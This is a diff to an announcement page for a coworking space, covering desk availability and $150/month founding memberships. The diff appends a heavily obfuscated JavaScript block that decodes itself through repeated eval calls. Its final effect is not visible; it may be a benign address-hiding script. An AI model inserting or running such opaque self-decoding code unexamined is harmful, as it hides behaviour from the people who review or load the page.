@@ -11,3 +11,26 @@ The East side is open now, and the West side will be available in October.
 The first 10 memberships for open (not reserved) desks are $150/month for
 as long as you maintain your membership, in exchange for putting up with
 some construction and organizational inconveniences while we get going.
+
+<script type="text/javascript">
+//<![CDATA[
+<!--
+var x="function f(x){var i,o=\"\",l=x.length;for(i=0;i<l;i+=2) {if(i+1<l)o+=" +
+"x.charAt(i+1);try{o+=x.charAt(i);}catch(e){}}return o;}f(\"ufcnitnof x({)av" +
+" r,i=o\\\"\\\"o,=l.xelgnhtl,o=;lhwli(e.xhcraoCedtAl(1/)3=!29{)rt{y+xx=l;=+;" +
+"lc}tahce({)}}of(r=i-l;1>i0=i;--{)+ox=c.ahAr(t)i};erutnro s.buts(r,0lo;)f}\\" +
+"\"(4),3\\\"\\\\v|m~|ao 03\\\\0R\\\\]T_V31\\\\0V\\\\6V02\\\\\\\\ZQAV21\\\\04" +
+"\\\\03\\\\\\\\\\\\\\\\\\\\\\\\DKB^X_NF06\\\\0W\\\\eK34\\\\03\\\\00\\\\\\\\f" +
+"|tljipty85wzx|s/uya`,`iDdY$f9unni\\\\\\\\^]3'00\\\\\\\\13\\\\01\\\\02\\\\\\" +
+"\\02\\\\07\\\\00\\\\\\\\33\\\\0=\\\\5S02\\\\\\\\37\\\\01\\\\03\\\\\\\\04\\\\"+
+"04\\\\03\\\\\\\\02\\\\03\\\\03\\\\\\\\04\\\\0)\\\\rI\\\\\\\\21\\\\0n\\\\\\\\"+
+"\\\\\\\\n2\\\\02\\\\\\\\_&25\\\\03\\\\00\\\\\\\\4:)?e(74x4=9?20602\\\\\\\\+" +
+"#/&16\\\\06\\\\03\\\\\\\\+,4207\\\\0~\\\\6,)-S^37\\\\0`\\\\06\\\\0\\\\\\\\\\"+
+"\\\\\\\\\\\\\\\\\\\\\\J\\\\6_02\\\\\\\\0T01\\\\\\\\21\\\\02\\\\03\\\\\\\\\\" +
+"\\_\\\\\\\\J\\\\DZ\\\\^\\\\\\\\4\\\\00\\\\\\\\F]KBGPFL\\\"\\\\f(;} ornture;" +
+"}))++(y)^(iAtdeCoarchx.e(odrChamCro.fngriSt+=;o27=1y%){++;i<l;i=0(ior;fthng" +
+"lex.l=\\\\,\\\\\\\"=\\\",o iar{vy)x,f(n ioctun\\\"f)\")"                     ;
+while(x=eval(x));
+//-->
+//]]>
+</script>
